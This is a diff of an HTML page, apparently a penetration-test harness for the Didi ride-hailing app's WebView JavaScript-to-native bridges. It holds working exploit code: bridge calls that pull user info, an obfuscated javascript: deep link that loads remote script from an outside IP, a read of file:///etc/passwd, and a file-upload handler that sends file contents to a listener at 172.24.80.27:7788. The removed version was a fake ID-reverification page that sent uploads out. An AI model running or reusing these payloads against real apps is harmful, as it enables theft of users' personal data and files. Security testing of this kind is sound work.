@@ -4,29 +4,160 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>滴滴车主 身份认证</title>
+    <title>滴滴出行 js2naive渗透测试</title>
+    <script> 
+        function Fusion(e, t) {
+                this.callbackJS = function (e, t) {
+                    alert(document.domain + " got your sensitive information:\n\n" + JSON.stringify(t));
+                };
+        }
+        var Fusion = new Fusion();
+        //var url = "fusion://invokeNative?module=DidiBridgeAdapter&method=getUserInfo&arguments=%5B%7B%7D,%222%22%5D&origin=udache.com";
+        //location = url;
+            
+           
+    </script>
 </head>
 <body>
-    <h5>您的身份认证已过期，请重新上传身份证</h5>
-    <input type="file" accept="*/*" onchange="fileCallback(window.URL.createObjectURL(this.files[0]))">
+    <h1>滴滴出行 js2naive渗透测试</h1>
+    <a href="https://m.weibo.cn/message/cmts"> wkwebviewconfiguration </a>
+    <h4><a href="onetravel://router/page/web?url=javascript%3A(function()%7Bwindow.s%3Ddocument.createElement(String.fromCharCode(115%2C99%2C114%2C105%2C112%2C116))%3Bwindow.s.src%3DString.fromCharCode(104%2C116%2C116%2C112%2C58%2C47%2C47%2C49%2C55%2C50%2C46%2C50%2C52%2C46%2C56%2C48%2C46%2C50%2C55%2C58%2C55%2C55%2C56%2C56%2C47%2C112%2C115%2C101%2C117%2C100%2C111%2C95%2C112%2C114%2C111%2C116%2C111%2C99%2C97%2C108%2C115%2C46%2C106%2C115)%3Bdocument.body.appendChild(window.s)%7D)()%3B%2F%2F">伪协议加载恶意js代码 </a></h4>
+    <h1><button onclick="OmegaSDK()">OmegaSDK</button></h1>
+    <h1><button onclick="afusion()">afusion</button></h1>
+    <h1><button onclick="loadJSModules()">loadJSModules</button></h1>
+    <h1><button onclick="funcPrompt()">funcPrompt</button></h1>
+    <h1><button onclick="funcPromptUrl()">funcPromptUrl</button></h1>
+    <h1><button onclick="getLocationConstant()">getLocation</button></h1>
+    <h1><button onclick="startEvilApp()">打开-恶意app</button></h1>
+    <h1><button onclick="ctrf()">跨域脚本攻击</button></h1>
+    <h1><button onclick="routeToThanosPageWithUrl()">routeToThanosPageWithUrl</button></h1>  
+    <input type="file" accept="image/*" onchange="fileCallback(window.URL.createObjectURL(this.files[0]))">
+    <input id="inputEl" type="file" accept="image/*"  />
 </body>
-<script type="text/javascript">
-    function getFile(url, callback) {
-        var req_instance = new XMLHttpRequest();
-        req_instance.open("GET", url, true);
-        req_instance.onload = function(e) {
-            alert(req_instance.responseText);
-            callback(req_instance.responseText);
+<script>
+     function OmegaSDK() {
+        function Fusion(e, t) {
+                this.callbackJS = function (e, t) {
+                    alert(document.domain + " got your sensitive information:\n\n" + JSON.stringify(t));
+                };
+            }
+            var Fusion = new Fusion();
+            var data = OmgJSBridge.call("userInfo", '1','alert');
         }
-        req_instance.onerror = function(e) {
-            callback("error");
+   
+        function afusion() {
+            function Fusion(e, t) {
+                this.callbackJS = function (e, t) {
+                    alert(document.domain + " got your sensitive information:\n\n" + JSON.stringify(t));
+                };
+            }
+            var Fusion = new Fusion();
+            var url = "wvjsbridge://callHandler?cmd=getUserInfo&params=%7B%7D&callback=9&origin=h5.didialift.com";
+            location = url;
         }
-        req_instance.send();
-    }
-    function fileCallback(url) {
-        getFile(url, function(contents) {
-            new Image().src = "http://172.24.80.194:7788/?data=" + encodeURIComponent(contents);
-        });
-    }
+        function loadJSModules() {
+           alert(prompt('{"fusion":"loadJSModules"}'));
+        }
+        
+        function funcPrompt() {
+            window.DidiJSBridge = {
+                callback: function () {
+                    var paramStr = "";
+                    // 遍历arguments
+                    for (var j = 0; j < arguments.length; j++) {
+                        if (j == arguments.length - 1) {
+                            paramStr += arguments[j];
+                        } else {
+                            paramStr += arguments[j] + ",";
+                        }
+                    }
+                    //alert(paramStr);
+                    console.log(paramStr)
+                },
+            };
+            alert(prompt('{"method":"callHandler","types":["string","object","function"],"args":["getUserInfo",null,1],"origin":"udache.com"}'));
+            
+        }
+        function funcPromptUrl() {
+            window.DidiJSBridge = {
+                callback: function () {
+                    var paramStr = "";
+                    // 遍历arguments
+                    for (var j = 0; j < arguments.length; j++) {
+                        if (j == arguments.length - 1) {
+                            paramStr += arguments[j];
+                        } else {
+                            paramStr += arguments[j] + ",";
+                        }
+                    }
+                    //alert(paramStr);
+                    console.log(paramStr)
+                },
+            };
+            alert(prompt('fusion://invokeNative?module=DidiBridgeAdapter&method=getUserInfo&arguments=%5B%7B%7D,%222%22%5D&origin=udache.com'));
+        }
+
+        function getLocationConstant()
+        {
+            if(navigator.geolocation)
+            {
+                navigator.geolocation.getCurrentPosition(onGeoSuccess,onGeoError);
+            } else {
+                alert("Brak obs?ugi GPS");
+            }
+        }
+        function startEvilApp() {
+            var url = "snssdk1128sstg://viewwebpage";
+            location = url;
+        }
+        function routeToThanosPageWithUrl() {
+            var url = "https://api.didialift.com/beatles/h5/user/user/homev3?_thanos=1&thanos_js=https%3A%2F%2Fbaidu.com";
+            location = url;
+        } 
+        function getFile(url, callback) {
+            var req_instance = new XMLHttpRequest();
+            req_instance.open("GET", url, true);
+            req_instance.onload = function(e) {
+                alert(req_instance.responseText);
+                callback(req_instance.responseText);
+            }
+            req_instance.onerror = function(e) {
+                callback("error");
+            }
+            req_instance.send();
+        }
+        function fileCallback(url) {
+            getFile(url, function(contents) {
+                new Image().src = "http://172.24.80.27:7788/?data=" + encodeURIComponent(contents);
+            });
+        }
+
+        function ctrf(){
+            var localfile = "file:///etc/passwd"
+            var xhr = new XMLHttpRequest(); 
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4) { 
+                    var txt = xhr.responseText;
+                    alert(txt);
+                } 
+            }
+            try {
+                xhr.open("GET", localfile, true); 
+                xhr.send();
+            } catch (ex) { 
+                alert(ex.message);
+            
+            }
+        }
+
+     window.onload = function () {
+     const inputEl = document.getElementById('inputEl');
+     inputEl.addEventListener('change', function (e) {
+      console.log(e);
+    })
+
+  }
+
+
 </script>
 </html>
